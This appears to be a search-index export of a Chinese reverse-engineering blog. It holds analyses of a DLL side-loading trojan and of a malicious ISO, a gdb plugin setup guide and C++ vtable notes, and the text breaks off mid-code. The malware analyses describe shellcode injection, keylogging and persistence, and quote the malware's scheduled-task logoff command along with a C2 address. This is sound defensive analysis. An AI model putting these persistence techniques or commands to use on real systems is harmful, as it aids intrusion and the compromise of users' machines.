[{"id":"d8609f7faf5edcbbc1a1648becebe73e","title":"某白加黑木马样本分析","content":"一、概述样本基本信息（4个文件）样本名称：a5c0Lm.exe、ClassicExplorer32.dll、ffff.pol、ffff.lop\nMD5：ae105528a6c5758ccf18705a8c208a97、7166253c768c66f0c3f75f4490d7dca8、9a726d190f558dfdefea623e521dedeb、55cf7b579e38d963f0534f4e03e35a08\n主要行为a5c0Lm.exe拥有Ivaylo Beltchev白签名，程序运行后，会加载同目录下的ClassicExplorer32.dll，调用其导出函数ShowExplorerSettings向当前进程注入shellcode，然后读取同目录下的ffff.pol并解密出 dll程序，该dll程序首先会备份4个文件，利用com组件接口设置计划任务以进行持久性操作，然后继续读取同目录下的ffff.lop并解密出 dll程序并调用其导出函数Edge，进行删除原始文件、查询杀毒&#x2F;调试软件是否存在并关闭、打印运行信息、从47.242.80.168下载新payload并执行命令、记录用户键盘操作并发送给攻击者、发送请求获取新的c2服务器地址、设置注册表实现开机自启动、安装名为Sauron的服务以实现持久化操作等。\n二、样本行为分析a5c0Lm.exe该样本主要功能是获取用户名，并创建名称为用户名的互斥体，然后加载同目录下的ClassicExplorer32.dll，并调用其导出函数ShowExplorerSettings进行相关操作\n\nClassicExplorer32.dll向当前进程注入shellcode该样本导出函数ShowExplorerSettings开始执行后，首先会向当前进程注入shellcode，然后通过CreateRemoteThread创建远程线程执行注入的shellcode\n\n执行shellcodeshellcode首先通过函数名和函数hash获取指定函数\n\n然后加载ffff.pol文件进内存，并通过异或等方式解密pe文件头\n\n接着依次复制头数据和节表数据、重定位pe文件、构建导入表等，然后执行载入内存中的PE文件（解密后的ffff.pol），调用其入口函数\n\n\nffff.pol入口函数入口函数主要是调用DllMain函数\n\nDllMain函数函数开始会查询并创建互斥体{A30BD1B1-CB43-4604-86F5-56594AEE26A3}以防止进程多开，接着解析命令行参数，然后创建新线程，并将参数传递给线程函数\n\n\n新线程在新线程函数中，首先会检查当前登录用户是否具有管理员权限，若是，则设置注册表项降低UAC提示强度，并创建子线程检测是否存在调试软件&#x2F;杀毒软件\n\n然后依次读取当前进程所在文件夹下的a5c0Lm.ex、ClassicExplorer32.dll、ffff.pol、ffff.lop进内存\n\n然后设置死循环，不断备份已读入内存的4个文件，然后利用com组件接口设置计划任务保证样本一直在运行，以进行持久性操作\n\n\n生成随机字符串\n\n复制文件\n\n\n创建计划任务\n\n加载ffff.lop并执行创建完新线程后，继续读取同目录下的ffff.lop进内存，然后对其进行解密还原成pe文件\n\n然后申请出一块空间用于存储该文件加载到内存后展开的数据，依次进行拷贝文件头数据、复制节表数据、进行重定位、构建导入表、设置内存保护属性等操作\n\nPE文件加载完成后，会调用其入口函数，若入口函数返回true，则查找并调用其导出函数Edge\n\nffff.lop入口函数入口函数主要是调用DllMain函数返回1，此时其导出函数Edge将会被执行\n\n导出函数Edge入口函数返回1后，其导出函数Edge就会被执行，其主要功能如下：\n首先对原文件进行删除和修改文件属性等\n\n然后创建多个线程，查询杀毒&#x2F;调试软件是否存在并关闭、打印运行信息、执行命令、从47.242.80.168下载新payload并执行命令等\n\n\n记录用户键盘操作和输入桌面内容并保存至文件，随后发送给攻击者\n\n\n发送请求获取新的c2服务器地址\n\n设置注册表实现开机自启动\n\n安装名为Sauron的服务以实现持久化操作\n\n三、结论该样本为恶意程序逃逸对抗模块、恶意程序下载模块与键盘记录器模块，样本拥有Ivaylo Beltchev白签名躲避查杀，程序运行后，会依次加载并执行同目录下的dll文件，利用com组件接口设置计划任务保证样本一直处于运行状态，删除原始文件、查询杀毒&#x2F;调试软件是否存在并关闭、打印运行信息、从47.242.80.168下载新payload并执行命令、记录用户键盘操作并发送给攻击者、发送请求获取新的C2服务器地址、设置注册表实现开机自启动、安装名为Sauron的服务以实现持久化操作等。\n","slug":"某白加黑木马样本分析","date":"2025-05-28T05:39:13.000Z","categories_index":"","tags_index":"恶意样本,白加黑技术,逆向","author_index":"0netry"},{"id":"cbeedf2045c391671dd49388aa7a121e","title":"Ubuntu安装peda、pwndbg、gef","content":"pedaPEDA（Python Exploit Development Assistance for GDB）是一个强大的GDB插件。它提供了更多功能，如高亮显示反汇编代码、寄存器等信息。PEDA提供了一些实用新的命令，比如checksec、aslr等\n123cd /usr/localgit clone https://github.com/longld/peda.git ~/pedaecho &quot;source /usr/local/peda/peda.py&quot; &gt;&gt; ~/.gdbinit\n\n其实就是下载完成后, 将 \nsource &#x2F;usr&#x2F;local&#x2F;peda&#x2F;peda.py 写入~&#x2F;.gdbinit，具体可根据安装目录来更改\npwndbg1234cd /usr/localgit clone https://github.com/pwndbg/pwndbgcd pwndbg &amp;&amp; sudo ./setup.shecho &quot;source /usr/local/pwndbg/gdbinit.py&quot; &gt;&gt; ~/.gdbinit\n\ngef123cd /usr/localgit clone https://github.com/hugsy/gef.gitecho &quot;source /usr/local/gef/gef.py&quot; &gt;&gt; ~/.gdbinit\n\n确认插件生效使用gdb命令启动调试程序，出现类似字符串，说明已经成功安装\n\n切换插件方法一切换插件最简单的方法就是要用哪个插件就把哪个插件的source打开，其余用#注释，如下图~&#x2F;.gdbinit所示，表示启用gef插件\n\n方法二该方法通过自定义脚本实现，具体如下：\n①可以在~&#x2F;.gdbinit文件里自定义三个命令init-peda、init-pwndbg和init-gef来分别加载三个插件，这样启动gdb后可以再输入对应命令调用插件。\n1234567891011121314151617181920define init-pedasource /usr/local/peda/peda.pyenddocument init-pedaInitializes the PEDA (Python Exploit Development Assistant for GDB) frameworkenddefine init-gefsource /usr/local/gef/gef.pyenddocument init-gefInitializes GEF (GDB Enhanced Features)enddefine init-pwndbgsource /usr/local/pwndbg/gdbinit.pyenddocument init-pwndbgInitializes PwnDBGend\n\n②然后在&#x2F;usr&#x2F;bin目录下创建三个文件(若使用cgdb，则把gdb改成cgdb)\n\n创建&#x2F;usr&#x2F;bin&#x2F;gdb-peda并写入\n\n12#!/bin/shexec gdb -q -ex init-peda &quot;$@&quot;\n\n\n创建&#x2F;usr&#x2F;bin&#x2F;gdb-pwndbg并写入\n\n12#!/bin/shexec gdb -q -ex init-pwndbg &quot;$@&quot;\n\n\n创建&#x2F;usr&#x2F;bin&#x2F;gdb-gef并写入\n\n12#!/bin/shexec gdb -q -ex init-gef &quot;$@&quot;\n\n注：如果要结合cgdb使用，则把上面三个文件中的gdb改成cgdb\n③最后给每个文件加上可执行权限chmod +x &#x2F;usr&#x2F;bin&#x2F;gdb-*，直接输入gdb-peda、gdb-pwndbg、gdb-gef即可运行\n要想在root权限时能使切换生效，还需要编辑&#x2F;root&#x2F;.gdbinit文件，内容同~&#x2F;.gdbinit文件，如：\n123456789101112131415161718192021set auto-load safe-path /define init-pedasource /usr/local/peda/peda.pyenddocument init-pedaInitializes the PEDA (Python Exploit Development Assistant for GDB) frameworkenddefine init-gefsource /usr/local/gef/gef.pyenddocument init-gefInitializes GEF (GDB Enhanced Features)enddefine init-pwndbgsource /usr/local/pwndbg/gdbinit.pyenddocument init-pwndbgInitializes PwnDBGend\n\n参考https://ssooking.github.io/2019/12/gdb-peda%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/\nhttps://blog.csdn.net/gatieme/article/details/63254211\nhttps://blog.csdn.net/whbing1471/article/details/112410599\nhttps://blog.csdn.net/qq_39153421/article/details/115386527\nhttps://www.cnblogs.com/robotech/p/16378626.html\nhttps://blog.csdn.net/qq_41453285/article/details/88197518\nhttps://www.jianshu.com/p/04d7a0e61059\n","slug":"Ubuntu安装peda、pwndbg、gef","date":"2024-03-09T13:01:38.000Z","categories_index":"","tags_index":"linux逆向工具","author_index":"0netry"},{"id":"0fa9719b9833354b768a1db954a5b0e7","title":"恶意iso文件分析","content":"iso信息文件信息\n文件内容\ndoc文档doc加密数据\nWinWord.exe即Concept Note Strategic Dialog Version 30.1.docx.exe\n签名信息\n详细信息\n运行运行Concept Note Strategic Dialog Version 30.1.docx.exe\n加载当前目录下的MSVCR100.dll\n使用process monitor监控\n\n使用Dependency walker监控\n\n创建注册表项dll创建的\n\n\n该项主要是通过powershell启动MSBild.exe运行解密出的project xml文件。dll创建的\n\n创建定时任务dll创建的\n1SCHTASKS /CREATE /f /TN &quot;Health Check&quot; /TR &quot;shutdown /l /f&quot; /SC WEEKLY /d WED,FRI /ST 13:15\n\n每周三和周五13:15强行关闭应用程序并注销当前用户;\n最后创建名为“Health Check”的计划任务，在每周三、周五的13：15分启动，其操作为注销电脑，从而触发注册表winlogon项，以此实现驻留\n\nMSVCR100.dllMSVCR100.dll信息\n第一个功能函数查找iso解压目录中隐藏的以~开头的doc诱饵文件，并与0xCA进行异或解密\n\n解密得到xml文件\n\n保存到临时文件夹的临时文件wct1FDA.tmp中\n\n解密启动winword打开诱饵文档的命令\n\n创建进程执行启动windword打开诱饵文档命令\n\n第二个功能函数\n\n\n\n%TEMP%&#x2F;&#x2F;wct1FDA.tmp\n\n环境变量以加密方式存储在加载程序的数据部分内，并且 XOR 解密密钥（“0xa7”）在执行期间静态地用于执行解密。\n\n\n解密计划任务命令（xor 0xA7）\n\n\n\n创建进程启动定时任务\n1rdx=00000000003ED3F0 L&quot;SCHTASKS /CREATE /f /TN \\&quot;Health Check\\&quot; /TR \\&quot;shutdown /l /f\\&quot; /SC WEEKLY /d WED,FRI /ST 13:15&quot;\n\n\n附录iso：\n\nSHA256: 205f6808ab05ff3932ee799f37c227a7a950e07ea97f51d206e0563c83592e60\nMD5: 836184b7387b212f8b7f064d5e60f587\nSHA1: fcefbe984fa0e343ec51cb22b6119014a6b1ee36\n\n参考链接Schtasks（计划任务）命令详解-转载\nwindows系统shutdown命令大全详解\n浅谈powershell\n","slug":"恶意iso文件分析","date":"2023-04-08T02:22:11.000Z","categories_index":"","tags_index":"恶意样本,逆向,iso文件","author_index":"0netry"},{"id":"c3ef1bdebe04666f3d364f093474c8aa","title":"C++逆向——虚基类指针&&虚基类表 vs 虚函数指针&&虚函数表","content":"一、虚继承产生的虚基类表指针和虚基类表如下代码：写一个棱形继承，父类Father，子类Son1和Son2虚继承Base，又来一个类Grandson继承Son1和Son2。代码：\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;stdio.h&gt;#include &lt;string.h&gt;#pragma warning(disable : 4996)class Father&#123;public:\tint a;protected:\tint b;private:\tint c;&#125;;class Son1 :virtual public Father&#123;public:\tint a;protected:\tint b;private:\tint c;&#125;;class Son2 :virtual public Father&#123;public:\tint a;protected:\tint b;private:\tint c;&#125;;class Grandson :public Son1, public Son2&#123;public:\tint a;protected:\tint b;private:\tint c;&#125;;int main(int argc, char* argv[]) &#123;\tGrandson grandson;\treturn 0;&#125;\n\n首先对Father的内容是肯定的，三个整形变量，没有其它东西了，如下图：\n\n再来看看类Son1和Son2的东西，由于Son1和Son2的类本身内容相同，且都是虚继承Father类，所以Son1和Son2类的内容相同。如下两个图：\n\n\n上两个图是Son1类和Son2类的内容，这两个类创建的对象使用从Father类继承的内容就是委婉地通过vbptr到vbtale中找到继承的Father类内容的首地址访问的。虚基类表中的16是相对于Son类vbptr地址的偏移量，即继承的Father类的内容在子类中存放的首地址相对于Son的vbptr的地址的偏移量。Son1和Son2都继承父类Father，本来类大小为sizeof(Son)+sizeof(Father)&#x3D;12+12&#x3D;24的，但是由于是虚继承，Son类内会多一个虚指针，所以类大小多了4字节，变成了28字节。\n再来看看Grandson类的内容：\n\n从Son1继承的虚基类表里面的44是指Father类的内容到Son1的vbptr的地址偏移量为44（44-0）。同理，从Son2继承的虚基类表里面的28是指Father类的内容到Son1的vbptr地址偏移量为28（44-16）。这里可以看出，本来Son1和Son2类里面都有从Father继承的内容，但是由于Son1和Son2都是虚继承，Grandson继承Son1和Son2的时候，Father类的内容只有一份，避免了继承两份Father内容（Son1含一份，Son2含一份）而造成的资源浪费。不管Grandson是通过Son1还是通过Son2访问Father的内容，其实Son1和Son2都是通过自己的vbptr访问同一份Father的内容。\n如果Grandson也是以虚继承的方式继承Son1和Son2的呢？即把Grandson的继承代码改成以下方式：\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;stdio.h&gt;#include &lt;string.h&gt;#pragma warning(disable : 4996)class Father&#123;public:\tint a;protected:\tint b;private:\tint c;&#125;;class Son1 :virtual public Father&#123;public:\tint a;protected:\tint b;private:\tint c;&#125;;class Son2 :virtual public Father&#123;public:\tint a;protected:\tint b;private:\tint c;&#125;;class Grandson :virtual public Son1, virtual public Son2&#123;public:\tint a;protected:\tint b;private:\tint c;&#125;;int main(int argc, char* argv[]) &#123;\tGrandson grandson;\treturn 0;&#125;\n\nSon1和Son2以虚继承的方式继承Father造成的结果是Son1和Son2都多了一个虚基类指针指向虚基类表，虚基类表中记录着从Father继承过来的内容的首地址对Son1(Son2)类的vbptr的地址的偏移量。类比一下，不难想出，Grandson如果也以虚继承的方式继承Son1和Son2的话，那么Grandson本身肯定也会多一个虚基类指针，指向一个虚基类表，这个虚基类表中存放着从Son1继承过来的内容的首地址相对于Grandson类的vbprtr地址的偏移量，也存放着从Son2继承过来的内容的首地址相对于Grandson类的首地址的偏移量。除此之外还存放着一个东西，Father的内容的首地址相对于Grandson类的vbptr的地址的偏移量。所以Grandson的虚基类指针指向虚基类表，虚基类表中存放着三个地址偏移量：\n\n如上图（Son1和Son2的虚基类指针和虚基类表在上面分析过了，这里主要分析Grandson的虚基类指针和虚基类表），虚基类表中的16（16-0）、28（28-0）、44（44-0）分别对应着包含的Father、Son1、Son2的内容的首地址相对于Grandson的vbptr地址的偏移量。\n虚基类偏移&#x3D;虚基类首地址-虚继承子类的vbptr地址\n二、虚函数产生的虚函数指针和虚函数表注： 在这里不讨论动态多态和静态多态，只讨论分析虚指针和虚表的问题。\n首先，vbptr(virtual base pointer)虚基类指针和vfptr(virtual function pointer)虚函数指针是两个不同的东西，是可以共存的，上面已经说明vbptr是对于虚继承而言的产物，vfptr则是对于虚函数的产物。以下代码说明vbptr和vfptr可以共存：\n12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;string.h&gt;#pragma warning(disable : 4996)class Father&#123;public:\tint a;protected:\tint b;private:\tint c;&#125;;class Son1 :virtual public Father //虚继承(产生虚基类指针vbptr)&#123;\tvirtual void fun() &#123;&#125;//虚函数(产生虚函数指针vfptr)public:\tint a;protected:\tint b;private:\tint c;&#125;;int main(int argc, char* argv[]) &#123;\t//Grandson grandson;\tSon1 son1;\treturn 0;&#125;\n\n看一下Son1的结构：\n\n可以看出vbptr和vfptr是两个不同的指针，而且可以共存。vbptr指向的是虚基类表，虚基类表中放着Father内容的首地址相对于Son1 vbptr指针的地址的偏移量。vfbptr指向的是虚函数表，虚函数表中放着Son1的虚函数的地址。\n\n\n\n\n\n\n\n\n\n这里Son1的vbtable第0项是-4\n因为child_addr&#x3D;&amp;this-&gt;vbtable+this-&gt;vbtable[count]计算出来的，vbtable[0]是OffsetOf(class.vbtable)的相反数\nvbtable上面有vtable所以对象指针相对于vbtable的指针偏移为-4\n由于虚基类指针已经分析过，下面只针对虚函数指针展开分析。如下代码，父类函数虚函数，子类继承父类。\n1234567891011121314151617181920212223class Base&#123;public:\tvirtual void fun1() &#123;&#125;\tvirtual void fun2() &#123;&#125;public:\tint a;protected:\tint b;private:\tint c;&#125;;class Son1 :public Base &#123;public:\tint a;protected:\tint b;private:\tint c;&#125;;\n\n看一下Base类的结构：\n\n可以看出，由于Base类内函数虚函数，所以Base类会多一个虚函数指针，虚函数指针指向虚函数表，虚函数表中存放着虚函数的地址。再来看看Son1类里面的东西：\n\n可以看见Base的虚函数指针被Son1继承下来了，虚函数指针指向一个虚函数表，虚函数表中放着的是Base的两个虚函数的地址。那么如果Son1对Base的虚函数进行重写呢？比如对fun1函数进行重写：\n12345678910111213141516171819202122232425class Base&#123;public:\tvirtual void fun1() &#123;&#125;\tvirtual void fun2() &#123;&#125;public:\tint a;protected:\tint b;private:\tint c;&#125;;class Son1 :public Base &#123;public:\tvoid fun1() &#123;&#125;//对Base的虚函数fun1函数进行重写public:\tint a;protected:\tint b;private:\tint c;&#125;;\n\n\n可以发现，虚函数表中本来存放Base的虚函数fun1()的地址，Son1对Base的fun1函数进行重写后，虚函数表中原本存放Base的虚函数fun1的地址，现在存放了被Son1重写后的fun1函数的地址。这也就是我们说的当子类重写父类的某一个虚函数时，父类的这个虚函数会被重写后的函数覆盖。再想一下，如果Son1本身也有虚函数呢？和vbptr类比一下，会觉得如果Son1本身有虚函数的话，那么Son1本身也会有一个虚函数指针，指向一个虚函数表，虚函数表中放着Son1的虚函数的地址。但是事实并非如此！如下所示：\n1234567891011121314151617181920212223242526class Base&#123;public:\tvirtual void fun1() &#123;&#125;//对Base的虚函数fun1函数进行重写\tvirtual void fun2() &#123;&#125;//Son1自己的虚函数public:\tint a;protected:\tint b;private:\tint c;&#125;;class Son1 :public Base &#123;public:\tvoid fun1() &#123;&#125;\tvirtual void fun3() &#123;&#125;public:\tint a;protected:\tint b;private:\tint c;&#125;;\n\n看一下Son1的结构：\n\n可以看见，Son1本身还是没有vfptr，而是仍旧用从Base继承过来的vfptr，而且函数表也是只有一个，Son1的虚函数fun3的地址直接添加在虚函数表里面（在其他函数地址下面）。由此可见，一个类如果有虚函数，并且继承的有函数指针，那么这个类会继续用继承的vfptr，而且自己的虚函数地址会继续存放在同一个虚函数表中。但是不意味着每个类都只有一个虚函数指针和一个虚函数表，比如，两个类都有虚函数指针和虚函数表，又来一个”孙子”类继承这两个类，那么”孙子”类里面就会有两个虚函数指针，两个虚函数表。如下代码：\n1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950class Base&#123;public:\tvirtual void fun1() &#123;&#125;\tvirtual void fun2() &#123;&#125;public:\tint a;protected:\tint b;private:\tint c;&#125;;class Son1 :public Base &#123;public:\tvirtual void fun3() &#123;&#125;public:\tint a;protected:\tint b;private:\tint c;&#125;;class Son2 :public Base&#123;public:\tvirtual void fun4() &#123;&#125;public:\tint a;protected:\tint b;private:\tint c;&#125;;class Grandson :public Son1,public Son2&#123;public:\tvoid fun1()&#123;&#125;\tvirtual void fun5() &#123;&#125;public:\tint a;protected:\tint b;private:\tint c;&#125;;\n\nSon1和Son2的结构不用看了，上面已经分析过了，用继承的base的vfptr，虚函数地址和base的虚函数地址也存放在同一个虚函数表中。看一下Grandson的结构：\n\n可以看见，Grandson从Son1和Son2分别都继承了一份虚函数表，和分别都继承了一个虚函数指针。总共两个虚函数指针和两个虚函数表。而Grandson重写后的fun1函数将从Son1继承过来的虚函数表中的fun1覆盖了，而Grandson自己的虚函数fun5()也存放在从Son1继承过来的虚函数表中。在这里有一个规则:1.虚函数地址按照其声明顺序放于虚函数表中。2.父类的虚函数在子类的虚函数前面。3.被重写的函数放到了虚函数表中原来父类虚函数的位置。即原来的虚函数的地址直接被覆盖。\n发现从Son2继承过来的虚函数表中的fun1位置被&amp;thunk: this-&#x3D;28;goto GrandSon::fun1替代thunk我查了一下，说是一种thunk技术。thunk是一组动态生成的ASM指令，它记录了窗口类对象的this指针，这组指令既可以当作函数，也可以是窗口过程来使用。（如果真是这个知识的话，那么这里已经超出本人理解范围了）。猜测就是Son2的函数表里面的fun1并没有被覆盖，而是用了另一种技术调用Grand::fun1。this -&#x3D; 28这句代码中，this应该是Son2的vfptr，而Son2的vfptr -&#x3D; 28，那么就指向了Son1的vfptr，goto Grandson::fun1就是转到Grandson::fun1函数。所以本人猜测，是通过回转到Son1的vfptr指向的虚函数表中找到Grandson::fun1函数的地址，然后调用。对于thunk，在其中不知道发挥着怎样的作用，已经超出本人知识范围了，网上搜了一下，也看的迷迷糊糊的。总之，是通过某种方式调用Grand::fun1，而并不是简单的覆盖Son2的fun1就是了。\n总结1.如果基类有虚函数表，那么子类直接使用基类的虚函数表。且实例中虚函数表地址值存储顺序就是基类继承顺序。2.继承类新增的虚函数排在第一个虚函数表中，且在基类虚函数后面。3.子类重写父类的虚函数，只有按顺序第一个包含被重写的虚函数的地址的虚函数表中的原虚函数地址被覆盖，后面的虚函数表中如果也包含这个虚函数地址，那么就不是简简单单的覆盖，而是用更像是回调的方式调用重写后的函数。\n参考链接C++中虚继承产生的虚基类指针和虚基类表，虚函数产生的虚函数指针和虚函数表\n","slug":"C++逆向——虚基类指针&&虚基类表 vs 虚函数指针&&虚函数表","date":"2023-03-12T11:53:28.000Z","categories_index":"","tags_index":"c++逆向","author_index":"0netry"},{"id":"1329f4c6c2b96d3a354509a097c90b2b","title":"C++逆向——全局类对象","content":"全局对象\n生命周期: main 开始之前构造 ,main结束之后析构\n因此在main函数之前初始化,构造属于初始化,因此在Inititem（c++) 中构造\n先调用构造函数，然后再通过atexit函数注册析构函数，在软件退出的时候调用析构函数。\n在调用析构以前，该全局变量都是有效的。\n\n全局对象构造函数和析构函数的识别源代码：\n123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;stdio.h&gt;#include &lt;string.h&gt;class CPerson&#123;public:    CPerson()    &#123;        m_pszName = new char[100];        strcpy_s(m_pszName, 99, &quot;HELLO&quot;);        m_nAge = 0;        printf(&quot;%s\\n&quot;, __FUNCTION__);    &#125;    CPerson(int nSize)    &#123;        m_pszName = new char[nSize];        strcpy_s(m_pszName, nSize - 1, &quot;HELLO&quot;);        m_nAge = 0;        printf(&quot;%s\\n&quot;, __FUNCTION__);    &#125;    ~CPerson()    &#123;        if (m_pszName != nullptr) &#123;            delete[] m_pszName;            m_pszName = nullptr;        &#125;        printf(&quot;%s\\n&quot;, __FUNCTION__);    &#125;    int  GetAge() const &#123;        return m_nAge;    &#125;    void  SetAge(int nAge) &#123;        m_nAge = nAge;    &#125;private:    char* m_pszName;    int m_nAge;&#125;;CPerson  g_pObj;int main()&#123;    printf(&quot;main end\\n&quot;);    return 0;&#125;\n\nida汇编及伪代码视图：\n1.首先通过Ctrl+E键定位到mainCRTStartup函数，然后再进入__scrt_common_main_seh函数\n\n2.在__scrt_common_main_seh函数有两个函数用于全局数据的初始化\n_initterm_e函数用于对C语言进行初始化\n\n_initterm函数用于对C++语言进行初始化\n\n3.全局类对象的构造代理函数数组就位于_initterm函数的两个参数之间\n\n4.构造代理函数数组中保存了全局类的构造代理函数，点击进入其中一个构造代理函数，可以看到其主要就是调用构造函数以及注册析构函数\n\n构造代理函数\n\n\n\n析构代理函数\n\n\n传递构造函数的参数构造函数本身是不可以传参数的,所以得生成一个函数,然后靠这个函数传值,这也是全局对象一定会产生构造代理的原因,就算内联还是得产生构造代理。\n查找全局对象1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt;#include &lt;string.h&gt;#pragma warning(disable : 4996)class CPerson&#123;public:    CPerson()    &#123;        m_pszName = new char[100];        strcpy_s(m_pszName, 99, &quot;HELLO&quot;);        m_nAge = 0;        printf(&quot;%s\\n&quot;, __FUNCTION__);    &#125;    CPerson(int nSize)    &#123;        m_pszName = new char[nSize];        strcpy_s(m_pszName, nSize - 1, &quot;HELLO&quot;);        m_nAge = 0;        printf(&quot;%s\\n&quot;, __FUNCTION__);    &#125;    ~CPerson()    &#123;        if (m_pszName != nullptr) &#123;            delete[] m_pszName;            m_pszName = nullptr;        &#125;        printf(&quot;%s\\n&quot;, __FUNCTION__);    &#125;    int  GetAge() const &#123;        return m_nAge;    &#125;    void  SetAge(int nAge) &#123;        m_nAge = nAge;    &#125;private:    char* m_pszName;    int m_nAge;&#125;;CPerson  g_pObj;int main()&#123;    printf(&quot;Age:%d\\r\\n&quot;, g_pObj.GetAge());    printf(&quot;main end\\n&quot;);    return 0;&#125;\n\n\n使用快捷键x查看指定对象 被哪些函数所调用 快速定位全局对象\n\n总结因此识别全局对象只需要看main之前有没有构造代理，构造代理里面可以同时初始化多个全局对象,即多个全局对象可以共用一个全局代理函数，如果类本身没有 构造 和析构函数,可以还原成结构体,因为没有区别\n全局对象数组123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;stdio.h&gt;#include &lt;string.h&gt;#pragma warning(disable : 4996)class CPerson&#123;public:    CPerson()    &#123;        m_pszName = new char[100];        strcpy_s(m_pszName, 99, &quot;HELLO&quot;);        m_nAge = 0;        printf(&quot;%s\\n&quot;, __FUNCTION__);    &#125;    CPerson(int nSize)    &#123;        m_pszName = new char[nSize];        strcpy_s(m_pszName, nSize - 1, &quot;HELLO&quot;);        m_nAge = 0;        printf(&quot;%s\\n&quot;, __FUNCTION__);    &#125;    ~CPerson()    &#123;        if (m_pszName != nullptr) &#123;            delete[] m_pszName;            m_pszName = nullptr;        &#125;        printf(&quot;%s\\n&quot;, __FUNCTION__);    &#125;    int  GetAge() const &#123;        return m_nAge;    &#125;    void  SetAge(int nAge) &#123;        m_nAge = nAge;    &#125;private:    char* m_pszName;    int m_nAge;&#125;;CPerson  g_pObj;CPerson  g_pObj2[10];int main()&#123;    printf(&quot;Age:%d\\r\\n&quot;, g_pObj.GetAge());    printf(&quot;main end\\n&quot;);    return 0;&#125;\n\n构造代理函数数组\n对象构造代理函数\n对象析构代理函数\n对象数组构造代理函数\n对象数组析构代理函数\n全局new对象123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;stdio.h&gt;#include &lt;string.h&gt;#pragma warning(disable : 4996)class CPerson&#123;public:    CPerson()    &#123;        m_pszName = new char[100];        strcpy_s(m_pszName, 99, &quot;HELLO&quot;);        m_nAge = 0;        printf(&quot;%s\\n&quot;, __FUNCTION__);    &#125;    CPerson(int nSize)    &#123;        m_pszName = new char[nSize];        strcpy_s(m_pszName, nSize - 1, &quot;HELLO&quot;);        m_nAge = 0;        printf(&quot;%s\\n&quot;, __FUNCTION__);    &#125;    ~CPerson()    &#123;        if (m_pszName != nullptr) &#123;            delete[] m_pszName;            m_pszName = nullptr;        &#125;        printf(&quot;%s\\n&quot;, __FUNCTION__);    &#125;    int  GetAge() const &#123;        return m_nAge;    &#125;    void  SetAge(int nAge) &#123;        m_nAge = nAge;    &#125;private:    char* m_pszName;    int m_nAge;&#125;;CPerson  g_pObj;CPerson  g_pObj2[10];CPerson* g_pObj3 = new CPerson(10);int main()&#123;    printf(&quot;Age:%d\\r\\n&quot;, g_pObj.GetAge());    printf(&quot;main end\\n&quot;);    return 0;&#125;\n\n构造代理函数数组\n对象构造代理函数\n对象析构代理函数\n对象数组构造代理函数\n对象数组析构代理函数\nnew对象构造代理函数\n静态全局对象静态全局对象和普通全局对象没有区别,只是作用域不同 ,因此静态是无法还原的,他只是在编译的时候做检查。对于编译器来说,跟普通全局对象是一样的。\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &lt;stdio.h&gt;#include &lt;string.h&gt;#pragma warning(disable : 4996)class CPerson&#123;public:    CPerson()    &#123;        m_pszName = new char[100];        strcpy_s(m_pszName, 99, &quot;HELLO&quot;);        m_nAge = 0;        printf(&quot;%s\\n&quot;, __FUNCTION__);    &#125;    CPerson(int nSize)    &#123;        m_pszName = new char[nSize];        strcpy_s(m_pszName, nSize - 1, &quot;HELLO&quot;);        m_nAge = 0;        printf(&quot;%s\\n&quot;, __FUNCTION__);    &#125;    ~CPerson()    &#123;        if (m_pszName != nullptr) &#123;            delete[] m_pszName;            m_pszName = nullptr;        &#125;        printf(&quot;%s\\n&quot;, __FUNCTION__);    &#125;    int  GetAge() const &#123;        return m_nAge;    &#125;    void  SetAge(int nAge) &#123;        m_nAge = nAge;    &#125;private:    char* m_pszName;    int m_nAge;&#125;;static CPerson  g_pObj;int main()&#123;    printf(&quot;Age:%d\\r\\n&quot;, g_pObj.GetAge());    printf(&quot;main end\\n&quot;);    return 0;&#125;\n\n\nmain函数\n\n\n\n构造代理函数数组\n\n\n\n构造代理函数\n\n\n\n析构代理函数\n\n\n静态局部对象123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;stdio.h&gt;#include &lt;string.h&gt;#pragma warning(disable : 4996)class CPerson&#123;public:    CPerson()    &#123;        m_pszName = new char[100];        strcpy_s(m_pszName, 99, &quot;HELLO&quot;);        m_nAge = 0;        printf(&quot;%s\\n&quot;, __FUNCTION__);    &#125;    CPerson(int nSize)    &#123;        m_pszName = new char[nSize];        strcpy_s(m_pszName, nSize - 1, &quot;HELLO&quot;);        m_nAge = 0;        printf(&quot;%s\\n&quot;, __FUNCTION__);    &#125;    ~CPerson()    &#123;        if (m_pszName != nullptr) &#123;            delete[] m_pszName;            m_pszName = nullptr;        &#125;        printf(&quot;%s\\n&quot;, __FUNCTION__);    &#125;    int  GetAge() const &#123;        return m_nAge;    &#125;    void  SetAge(int nAge) &#123;        m_nAge = nAge;    &#125;private:    char* m_pszName;    int m_nAge;&#125;;int main()&#123;    static CPerson  g_pObj;    printf(&quot;Age:%d\\r\\n&quot;, g_pObj.GetAge());    printf(&quot;main end\\n&quot;);    return 0;&#125;\n\nmain函数会在main函数入口 调用构造代理,放全局也没问题(老版本就是),前提是不能有变参\n\n静态局部变量传变参此时,构造代理只能放main(),不能放全局,通过标志 $TSS0 来判断是否初始化 ,如果&lt;&#x3D; 0 就代表已经初始化,如果没初始化,就会调构造代理,如果已经初始化,就不会调用 不会这个\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &lt;stdio.h&gt;#include &lt;string.h&gt;#pragma warning(disable : 4996)class CPerson&#123;public:    CPerson()    &#123;        m_pszName = new char[100];        strcpy_s(m_pszName, 99, &quot;HELLO&quot;);        m_nAge = 0;        printf(&quot;%s\\n&quot;, __FUNCTION__);    &#125;    CPerson(int nSize)    &#123;        m_pszName = new char[nSize];        strcpy_s(m_pszName, nSize - 1, &quot;HELLO&quot;);        m_nAge = 0;        printf(&quot;%s\\n&quot;, __FUNCTION__);    &#125;    ~CPerson()    &#123;        if (m_pszName != nullptr) &#123;            delete[] m_pszName;            m_pszName = nullptr;        &#125;        